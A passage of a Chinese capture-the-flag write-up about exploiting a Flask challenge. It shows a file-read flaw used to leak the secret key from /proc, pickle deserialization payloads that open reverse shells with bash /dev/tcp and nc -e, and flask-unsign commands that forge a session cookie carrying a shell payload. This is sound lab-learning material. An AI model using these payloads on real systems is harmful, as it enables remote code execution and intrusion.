Flask, request, render_template, session<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;*******&quot;</span><br><br><span class="hljs-comment"># 定义 User 类</span><br>User = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,<br>    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-string">&#x27;__repr__&#x27;</span>: <span class="hljs-keyword">lambda</span> o: o.uname,<br>&#125;)<br><br><span class="hljs-comment"># 处理根路径</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index_handler</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;u&#x27;</span>):<br>        u = pickle.dumps(User())<br>        session[<span class="hljs-string">&#x27;u&#x27;</span>] = u<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/file?file=index.js&quot;</span><br><br><span class="hljs-comment"># 处理文件路径</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file_handler</span>():<br>    path = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    path = os.path.join(<span class="hljs-string">&#x27;static&#x27;</span>, path)<br>    <br>    <span class="hljs-comment"># 检查路径合法性</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path) <span class="hljs-keyword">or</span> os.path.isdir(path) \<br>            <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.py&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.sh&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> path:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;disallowed&#x27;</span><br><br>    <span class="hljs-comment"># 读取文件内容并返回</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>        content = fp.read()<br>    <span class="hljs-keyword">return</span> content<br><br><span class="hljs-comment"># 处理管理员页面</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_handler</span>():<br>    <span class="hljs-keyword">try</span>:<br>        u = session.get(<span class="hljs-string">&#x27;u&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(u, <span class="hljs-built_in">dict</span>):<br>            u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))<br>            u = pickle.loads(u)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;uhh?&#x27;</span><br><br>    <span class="hljs-comment"># 检查用户是否为管理员</span><br>    <span class="hljs-keyword">if</span> u.is_admin == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome, admin&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;who are you?&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure>

<p>先抓包看下<code>session</code>:，python的话估计是<code>JWT</code>:</p>
<p><img src="/img/hfctf2021final4.png" srcset="/img/loading.gif" lazyload alt="hfctf2021final4"></p>
<p><code>b</code>键对应的<code>base</code>64，在<code>/admin</code>路由下会进行处理：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))<br>u = pickle.loads(u)<br></code></pre></td></tr></table></figure>



<p>后面想着怎么读<code>secret_key</code>，之前碰到过读<code>/proc/self/environ</code>的，试试：</p>
<p><img src="/img/hfctf2021final6.png" srcset="/img/loading.gif" lazyload alt="hfctf2021final6"></p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">secret_key=glzji<span class="hljs-symbol">n22948575858</span>jfjfjufirijidjit<span class="hljs-name">g3</span>uiiuuh<br></code></pre></td></tr></table></figure>

<p>还读了<code>/proc/1/environ</code>，直接拿到flag了：</p>
<p><img src="/img/hfctf2021final7.png" srcset="/img/loading.gif" lazyload alt="hfctf2021final7"></p>
<p>正常做的话就是python反序列化+session伪造执行命令(这里直接反弹shell了，没试能不能执行ls啥的)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">import</span> os<br>        cmd = <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/IP/9001 0&gt;&amp;1&#x27;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (cmd,))<br>u = pickle.dumps(User())<br><span class="hljs-built_in">print</span>(b64encode(u))<br></code></pre></td></tr></table></figure>

<p><code>flask-unsigh</code>用法：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">flask-unsign <span class="hljs-attr">--unsign</span> <span class="hljs-attr">--decode</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;eyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.ZbCRbw.VSVb2deVeKAEUTAotx5adFSrhgY&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br><br>flask-unsign <span class="hljs-attr">--sign</span> <span class="hljs-attr">--cookie</span> <span class="hljs-string">&quot;&#123;&#x27;u&#x27;:&#123;&#x27;b&#x27;:&#x27;gASVTwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDRiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzQzLjEyOC43LjExNy85MDAxIDA+JjEnlIWUUpQu&#x27;&#125;&#125;&quot;</span> <span class="hljs-attr">--secret</span> <span class="hljs-string">&#x27;glzjin22948575858jfjfjufirijidjitg3uiiuuh&#x27;</span> <span class="hljs-attr">--no-literal-eval</span><br></code></pre></td></tr></table></figure>

<p>后面看了下，还有其它写法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br>User = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;<br>    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,<br>    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-string">&#x27;__repr__&#x27;</span>: <span class="hljs-keyword">lambda</span> o: o.uname,<br>    <span class="hljs-string">&#x27;__reduce__&#x27;</span>: <span class="hljs-keyword">lambda</span> o: (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc IP PORT -e /bin/sh&#x27;)&quot;</span>,))<br><br>&#125;)<br><br>u = pickle.dumps(User())<br><span class="hljs-built_in">print</span>(b64encode(u).decode())<br><span class="hljs-comment">#或者：</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">import</span> os<br>        cmd = <span class="hljs-string">&quot;cat /flag &gt; /tmp/test1&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (cmd,))<br></code></pre></td></tr></table></figure>

<h4 id="思路总结：-9"><a href="#思路总结：-9" class="headerlink" title="思路总结："></a>思路总结：</h4><p>简单<code>python</code>反序列化和<code>session</code>结合，任意文件读取，<code>/proc</code>。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" class="print-no-link">#做题记录</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>BuuCTF做题记录_9</div>
      <div>http://example.com/2023/12/28/2023-12-28-BuuCTF做题记录_9/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>notbad3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年12月28日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/12/29/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84.git%E6%B3%84%E9%9C%B2%E9%A2%98%E7%9B%AE/" title="记录一道很有意思的.git泄露题目">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">记录一道很有意思的.git泄露题目</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/12/28/2023-12-29-Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_1/" title="Java基础学习笔记">
                        <span class="hidden-mobile">Java基础学习笔记</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
